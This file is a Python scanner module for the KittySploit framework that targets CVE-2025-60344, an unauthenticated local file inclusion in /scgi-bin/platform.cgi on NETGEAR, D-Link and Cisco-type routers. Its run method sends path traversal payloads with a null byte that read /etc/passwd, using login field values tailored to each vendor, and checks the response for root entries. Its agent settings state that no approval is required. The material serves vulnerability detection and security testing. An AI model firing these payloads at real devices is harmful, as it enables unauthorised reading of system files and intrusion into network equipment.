#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Multiple routers /scgi-bin/platform.cgi LFI (CVE-2025-60344)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'platform.cgi - Unauth LFI Detection (CVE-2025-60344)',
        'description': (
            'Detects unauthenticated file disclosure via POST /scgi-bin/platform.cgi thispage= '
            'path traversal (NETGEAR/D-Link/Cisco Embedded HTTP Server).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2025', 'router', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2025-60344',
        ],
        'cve': 'CVE-2025-60344',
    }

    def run(self):
        probe = self.http_request(method='GET', path='/scgi-bin/platform.cgi', allow_redirects=False)
        if not probe or probe.status_code != 200:
            return False
        body_l = (probe.text or '').lower()
        file_path = 'etc/passwd'
        if 'netgear' in body_l:
            data = (
                f'thispage=../../../../../../../../../../{file_path}%00.htm'
                '&USERDBUsers.UserName=admin&USERDBUsers.Password=x'
                '&USERDBDomains.Domainname=geardomain'
                '&button.login.USERDBUsers.router_status=Login&Login.userAgent=ks'
            )
        elif 'd-link' in body_l or 'dlink' in body_l:
            data = (
                f'thispage=../../../../../../../../../../{file_path}%00.htm'
                '&Users.UserName=admin&Users.Password=x'
                '&button.login.Users.deviceStatus=Login&Login.userAgent=ks'
            )
        else:
            data = (
                'button.login.home=Se%20connecter&Login.userAgent=ks&reload=0'
                '&SSLVPNUser.Password=x&SSLVPNUser.UserName=x'
                f'&thispage=../../../../../../../../../../{file_path}%00.htm'
            )
        r = self.http_request(
            method='POST',
            path='/scgi-bin/platform.cgi',
            data=data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        if re.search(r'root:.*:0:0:', r.text or ''):
            self.set_info(
                severity='high',
                reason='platform.cgi LFI (CVE-2025-60344)',
                path='/scgi-bin/platform.cgi',
            )
            return True
        return False
